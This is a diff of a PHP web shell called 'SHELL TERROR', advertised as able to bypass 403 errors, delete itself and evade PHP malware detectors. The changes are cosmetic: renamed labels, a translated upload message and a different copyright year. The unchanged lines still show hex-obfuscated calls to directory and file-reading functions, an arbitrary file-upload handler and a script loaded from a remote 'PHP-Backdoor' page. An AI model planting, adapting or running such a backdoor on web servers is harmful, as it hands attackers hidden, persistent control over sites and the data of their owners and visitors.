@@ -1,7 +1,7 @@
 <?php
  
 /*
-    Shell do Edson (Terror)
+    SHELL TERROR
     Bypass 403 Forbidden / Auto Delete Shell / PHP Malware Detector / Minishell
 */
  
@@ -9,7 +9,7 @@ set_time_limit(0);
 error_reporting(0);
 error_log(0);
  
-$sname       = "TERROR SHELL" . "-V2";
+$sname       = "SHELL TERROR" . "-V2";
 $__gcdir     = "\x67" . "\x65\x74\x63\x77\x64";
 $__fgetcon7s = "\x66\x69\x6c\x65" . "\x5f\x67\x65\x74\x5f\x63\x6f\x6e\x74\x65\x6e\x74\x73";
 $__scdir     = "s" . "\x63\x61\x6e\x64\x69" . "r";
@@ -50,7 +50,7 @@ if (isset($_FILES['file'])) {
     if (copy($_FILES['file']['tmp_name'], $path . '/' . $_FILES['file']['name'])) {
         echo '<center><font color="#00ff00">Upload OK!</font></center><br/>';
     } else {
-        echo '<center><font color="red">Falha no Upload!</font></center><br/>';
+        echo '<center><font color="red">Upload FAILED!</font></center><br/>';
     }
 }
 echo '</td></tr><tr><td></table><div class="table-div"></div><input id="image" type="hidden">';
@@ -174,7 +174,7 @@ function perms($file)
     $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));
     return $info;
 }
-echo '<br><center>&copy; <span id="footer"></span> 2021.</center><br>';
+echo '<br><center>&copy; <span id="footer"></span> 2018.</center><br>';
 echo '<script type="text/javascript" src="//zerobyte-id.github.io/PHP-Backdoor/inc/footer.js"></script>';
 echo '</body></html><!-- EOF -->';
 ?>
